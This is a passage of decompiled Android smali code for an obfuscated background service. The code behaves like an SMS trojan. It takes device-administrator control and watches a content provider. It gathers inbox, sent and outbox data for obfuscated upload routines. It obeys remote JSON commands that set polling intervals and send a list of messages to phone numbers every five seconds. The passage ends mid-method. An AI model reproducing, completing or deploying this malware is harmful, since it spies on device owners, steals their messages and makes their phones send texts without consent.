.class public Lcom/azianames/foroneyhar/filnnomn;
.super Landroid/app/Service;

# interfaces
.implements Lcom/azianames/foroneyhar/ozpoxuz523b2;


# static fields
.field private static ttmhx7:J


# instance fields
.field private cehyzt7dw:Landroid/content/ComponentName;

.field private ozpoxuz523b2:Landroid/app/admin/DevicePolicyManager;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/azianames/foroneyhar/filnnomn;->ttmhx7:J

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic ttmhx7()J
    .locals 2

    sget-wide v0, Lcom/azianames/foroneyhar/filnnomn;->ttmhx7:J

    return-wide v0
.end method

.method static synthetic ttmhx7(J)J
    .locals 0

    sput-wide p0, Lcom/azianames/foroneyhar/filnnomn;->ttmhx7:J

    return-wide p0
.end method

.method public static ttmhx7(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;I)V
    .locals 3

    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/azianames/foroneyhar/filnnomn;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "type"

    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "phone"

    invoke-virtual {v0, v1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "message"

    invoke-virtual {v0, v1, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "id"

    invoke-static {p4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 7

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    invoke-virtual {p0}, Lcom/azianames/foroneyhar/filnnomn;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    new-instance v0, Lcom/azianames/foroneyhar/cehyzt7dw;

    invoke-direct {v0}, Lcom/azianames/foroneyhar/cehyzt7dw;-><init>()V

    invoke-virtual {v0, v1}, Lcom/azianames/foroneyhar/cehyzt7dw;->usuayu88rw4(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_3

    const v2, 0x7f050008

    invoke-virtual {v1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->e8kxjqktk9t:Ljava/lang/String;

    const v2, 0x7f050006

    invoke-virtual {v1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->lg71ytkvzw:Ljava/lang/String;

    const v2, 0x7f050009

    invoke-virtual {v1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    iput v2, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->ttmhx7:I

    const v2, 0x7f050007

    invoke-virtual {v1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    iput v2, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->ozpoxuz523b2:I

    invoke-static {}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7()J

    move-result-wide v2

    iput-wide v2, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    iget-wide v2, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    iget v4, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->ozpoxuz523b2:I

    mul-int/lit16 v4, v4, 0x3e8

    int-to-long v4, v4

    add-long/2addr v2, v4

    iput-wide v2, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    invoke-virtual {v0, v1}, Lcom/azianames/foroneyhar/cehyzt7dw;->fxug2rdnfo(Landroid/content/Context;)Z

    :cond_0
    :goto_0
    iget-wide v2, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Landroid/content/Context;Ljava/lang/Long;)V

    sget-object v2, Lcom/azianames/foroneyhar/ttmhx7;->ja66gqu:Ljava/lang/String;

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {p0}, Lcom/azianames/foroneyhar/filnnomn;->getBaseContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const/4 v4, 0x1

    new-instance v5, Lcom/azianames/foroneyhar/usuayu88rw4;

    new-instance v6, Landroid/os/Handler;

    invoke-direct {v6}, Landroid/os/Handler;-><init>()V

    invoke-direct {v5, p0, v6}, Lcom/azianames/foroneyhar/usuayu88rw4;-><init>(Lcom/azianames/foroneyhar/filnnomn;Landroid/os/Handler;)V

    invoke-virtual {v3, v2, v4, v5}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    iget-object v0, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->b5zlaptmyxarl:Lorg/json/JSONArray;

    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lez v0, :cond_1

    invoke-static {v1}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->fxug2rdnfo(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_1

    new-instance v0, Ljava/lang/Thread;

    new-instance v2, Lcom/azianames/foroneyhar/fxug2rdnfo;

    const/4 v3, 0x6

    const/4 v4, 0x0

    invoke-direct {v2, p0, p0, v3, v4}, Lcom/azianames/foroneyhar/fxug2rdnfo;-><init>(Lcom/azianames/foroneyhar/filnnomn;Lcom/azianames/foroneyhar/ozpoxuz523b2;I[Ljava/lang/String;)V

    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_1
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Lcom/azianames/foroneyhar/filnnomn;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    iput-object v0, p0, Lcom/azianames/foroneyhar/filnnomn;->ozpoxuz523b2:Landroid/app/admin/DevicePolicyManager;

    new-instance v0, Landroid/content/ComponentName;

    const-class v2, Lcom/azianames/foroneyhar/js3knzbdy/jiwj7en;

    invoke-direct {v0, v1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v0, p0, Lcom/azianames/foroneyhar/filnnomn;->cehyzt7dw:Landroid/content/ComponentName;

    invoke-static {v1}, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_2

    invoke-static {v1}, Lcom/azianames/foroneyhar/cehyzt7dw;->uin6g3d5rqgcbs(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcom/azianames/foroneyhar/filnnomn;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_2
    return-void

    :cond_3
    invoke-static {}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7()J

    move-result-wide v2

    iget-wide v4, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    cmp-long v2, v2, v4

    if-lez v2, :cond_0

    invoke-static {}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7()J

    move-result-wide v2

    iput-wide v2, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    iget-wide v2, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    iget v4, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->ttmhx7:I

    mul-int/lit16 v4, v4, 0x3e8

    int-to-long v4, v4

    add-long/2addr v2, v4

    iput-wide v2, v0, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    invoke-virtual {v0, v1}, Lcom/azianames/foroneyhar/cehyzt7dw;->fxug2rdnfo(Landroid/content/Context;)Z

    goto/16 :goto_0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 9

    const/4 v5, 0x4

    const/4 v4, 0x3

    const/4 v3, 0x2

    const/4 v0, 0x0

    const/4 v2, 0x1

    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    :try_start_0
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v6

    if-eqz v6, :cond_1

    const-string v1, "type"

    invoke-virtual {v6, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    if-eqz v1, :cond_1

    const-string v1, "type"

    invoke-virtual {v6, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v7

    const/4 v1, -0x1

    invoke-virtual {v7}, Ljava/lang/String;->hashCode()I

    move-result v8

    sparse-switch v8, :sswitch_data_0

    :cond_0
    move v0, v1

    :goto_0
    packed-switch v0, :pswitch_data_0

    :cond_1
    :goto_1
    return v2

    :sswitch_0
    const-string v3, "alarm"

    invoke-virtual {v7, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    goto :goto_0

    :sswitch_1
    const-string v0, "jobs"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    move v0, v2

    goto :goto_0

    :sswitch_2
    const-string v0, "offscreen"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    move v0, v3

    goto :goto_0

    :sswitch_3
    const-string v0, "catch"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    move v0, v4

    goto :goto_0

    :sswitch_4
    const-string v0, "inbox"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    move v0, v5

    goto :goto_0

    :sswitch_5
    const-string v0, "sent"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x5

    goto :goto_0

    :sswitch_6
    const-string v0, "outbox"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x6

    goto :goto_0

    :pswitch_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/azianames/foroneyhar/fxug2rdnfo;

    const/4 v3, 0x1

    const/4 v4, 0x0

    invoke-direct {v1, p0, p0, v3, v4}, Lcom/azianames/foroneyhar/fxug2rdnfo;-><init>(Lcom/azianames/foroneyhar/filnnomn;Lcom/azianames/foroneyhar/ozpoxuz523b2;I[Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    :pswitch_1
    :try_start_1
    const-string v0, "data"

    invoke-virtual {v6, v0}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/azianames/foroneyhar/filnnomn;->ttmhx7(Ljava/lang/String;)V

    goto :goto_1

    :pswitch_2
    invoke-virtual {p0}, Lcom/azianames/foroneyhar/filnnomn;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v1, p0, Lcom/azianames/foroneyhar/filnnomn;->ozpoxuz523b2:Landroid/app/admin/DevicePolicyManager;

    invoke-static {v0, v1}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ozpoxuz523b2(Landroid/content/Context;Landroid/app/admin/DevicePolicyManager;)V

    goto :goto_1

    :pswitch_3
    const/4 v0, 0x4

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v3, "phone"

    invoke-virtual {v6, v3}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v0, v1

    const/4 v1, 0x1

    const-string v3, "message"

    invoke-virtual {v6, v3}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v0, v1

    const/4 v1, 0x2

    aput-object v7, v0, v1

    const/4 v1, 0x3

    const-string v3, "id"

    invoke-virtual {v6, v3}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v0, v1

    new-instance v1, Ljava/lang/Thread;

    new-instance v3, Lcom/azianames/foroneyhar/fxug2rdnfo;

    const/4 v4, 0x5

    invoke-direct {v3, p0, p0, v4, v0}, Lcom/azianames/foroneyhar/fxug2rdnfo;-><init>(Lcom/azianames/foroneyhar/filnnomn;Lcom/azianames/foroneyhar/ozpoxuz523b2;I[Ljava/lang/String;)V

    invoke-direct {v1, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_1

    :sswitch_data_0
    .sparse-switch
        -0x74faa165 -> :sswitch_2
        -0x3bef1c43 -> :sswitch_6
        0x31dc56 -> :sswitch_1
        0x35cf98 -> :sswitch_5
        0x5897a51 -> :sswitch_0
        0x5a0eebb -> :sswitch_3
        0x5fb2286 -> :sswitch_4
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_3
        :pswitch_3
        :pswitch_3
    .end packed-switch
.end method

.method public ttmhx7(I[Ljava/lang/String;)V
    .locals 6

    invoke-virtual {p0}, Lcom/azianames/foroneyhar/filnnomn;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    new-instance v1, Lcom/azianames/foroneyhar/cehyzt7dw;

    invoke-direct {v1}, Lcom/azianames/foroneyhar/cehyzt7dw;-><init>()V

    invoke-virtual {v1, v0}, Lcom/azianames/foroneyhar/cehyzt7dw;->usuayu88rw4(Landroid/content/Context;)Z

    packed-switch p1, :pswitch_data_0

    :goto_0
    return-void

    :pswitch_0
    :try_start_0
    invoke-static {}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7()J

    move-result-wide v2

    iput-wide v2, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    iget-wide v2, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    iget v4, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->ttmhx7:I

    mul-int/lit16 v4, v4, 0x3e8

    int-to-long v4, v4

    add-long/2addr v2, v4

    iput-wide v2, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    invoke-virtual {v1, v0}, Lcom/azianames/foroneyhar/cehyzt7dw;->fxug2rdnfo(Landroid/content/Context;)Z

    invoke-static {v0, v1}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Landroid/content/Context;Lcom/azianames/foroneyhar/cehyzt7dw;)V

    iget-wide v0, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Landroid/content/Context;Ljava/lang/Long;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    :pswitch_1
    invoke-static {p0}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v2

    invoke-static {v2}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Ljava/util/List;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Landroid/content/Context;Lcom/azianames/foroneyhar/cehyzt7dw;Ljava/lang/String;)V

    goto :goto_0

    :pswitch_2
    invoke-static {p0}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->usuayu88rw4(Landroid/content/Context;)Ljava/util/HashMap;

    move-result-object v2

    invoke-static {v2}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Ljava/util/HashMap;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ozpoxuz523b2(Landroid/content/Context;Lcom/azianames/foroneyhar/cehyzt7dw;Ljava/lang/String;)V

    goto :goto_0

    :pswitch_3
    const/4 v1, 0x0

    aget-object v1, p2, v1

    invoke-static {v0, v1}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    :pswitch_4
    invoke-static {v0, v1, p2}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Landroid/content/Context;Lcom/azianames/foroneyhar/cehyzt7dw;[Ljava/lang/String;)V

    goto :goto_0

    :pswitch_5
    iget-object v2, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->b5zlaptmyxarl:Lorg/json/JSONArray;

    invoke-virtual {v2}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->cehyzt7dw(Landroid/content/Context;Lcom/azianames/foroneyhar/cehyzt7dw;Ljava/lang/String;)V

    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    iput-object v2, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->b5zlaptmyxarl:Lorg/json/JSONArray;

    invoke-virtual {v1, v0}, Lcom/azianames/foroneyhar/cehyzt7dw;->fxug2rdnfo(Landroid/content/Context;)Z

    goto :goto_0

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
    .end packed-switch
.end method

.method public ttmhx7(Ljava/lang/String;)V
    .locals 8

    const/4 v0, 0x0

    :try_start_0
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    new-instance v1, Lcom/azianames/foroneyhar/cehyzt7dw;

    invoke-direct {v1}, Lcom/azianames/foroneyhar/cehyzt7dw;-><init>()V

    invoke-virtual {v1, p0}, Lcom/azianames/foroneyhar/cehyzt7dw;->usuayu88rw4(Landroid/content/Context;)Z

    :try_start_1
    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->cpgyvt8o4r3:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->cpgyvt8o4r3:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v3

    iput v3, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->ttmhx7:I

    invoke-static {}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7()J

    move-result-wide v4

    iput-wide v4, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    iget-wide v4, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    iget v3, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->ttmhx7:I

    mul-int/lit16 v3, v3, 0x3e8

    int-to-long v6, v3

    add-long/2addr v4, v6

    iput-wide v4, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw:J

    :cond_0
    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->lqwegpi5:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1

    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->lqwegpi5:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->lg71ytkvzw:Ljava/lang/String;

    :cond_1
    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->mqnmk83l0o:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_2

    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->mqnmk83l0o:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->e8kxjqktk9t:Ljava/lang/String;

    :cond_2
    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->zk18i66egwxe:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->zk18i66egwxe:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    new-instance v3, Lorg/json/JSONArray;

    invoke-direct {v3}, Lorg/json/JSONArray;-><init>()V

    iput-object v3, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->iux03f6yieb:Lorg/json/JSONArray;

    :cond_3
    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->i422h07p3ed:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_4

    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->i422h07p3ed:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_4

    new-instance v3, Lorg/json/JSONArray;

    invoke-direct {v3}, Lorg/json/JSONArray;-><init>()V

    iput-object v3, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->ay6ebym1yp0qgk:Lorg/json/JSONArray;

    :cond_4
    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->fx9gujks:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_5

    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->fx9gujks:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_5

    new-instance v3, Lorg/json/JSONArray;

    invoke-direct {v3}, Lorg/json/JSONArray;-><init>()V

    iput-object v3, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->mhtc4dliin7r:Lorg/json/JSONArray;

    :cond_5
    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->w5mzcxwa3kamml:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_6

    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->w5mzcxwa3kamml:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v3

    iput-object v3, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->iux03f6yieb:Lorg/json/JSONArray;

    :cond_6
    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->j72htm5:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_7

    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->j72htm5:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v3

    iput-object v3, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->ay6ebym1yp0qgk:Lorg/json/JSONArray;

    :cond_7
    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->xf1q4c:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_8

    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->xf1q4c:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v3

    iput-object v3, v1, Lcom/azianames/foroneyhar/cehyzt7dw;->mhtc4dliin7r:Lorg/json/JSONArray;

    :cond_8
    invoke-virtual {v1, p0}, Lcom/azianames/foroneyhar/cehyzt7dw;->fxug2rdnfo(Landroid/content/Context;)Z

    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->ug2s4y:Ljava/lang/String;

    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_a

    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->ug2s4y:Ljava/lang/String;

    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v3

    move v1, v0

    :goto_0
    invoke-virtual {v3}, Lorg/json/JSONArray;->length()I

    move-result v4

    if-ge v1, v4, :cond_a

    invoke-virtual {v3, v1}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v4

    const-wide/16 v6, 0x1388

    invoke-static {v6, v7}, Landroid/os/SystemClock;->sleep(J)V

    sget-object v5, Lcom/azianames/foroneyhar/ttmhx7;->ck0x6f:Ljava/lang/String;

    invoke-virtual {v4, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    sget-object v6, Lcom/azianames/foroneyhar/ttmhx7;->wg4f90m80dyc0s:Ljava/lang/String;

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v5, v4}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_1
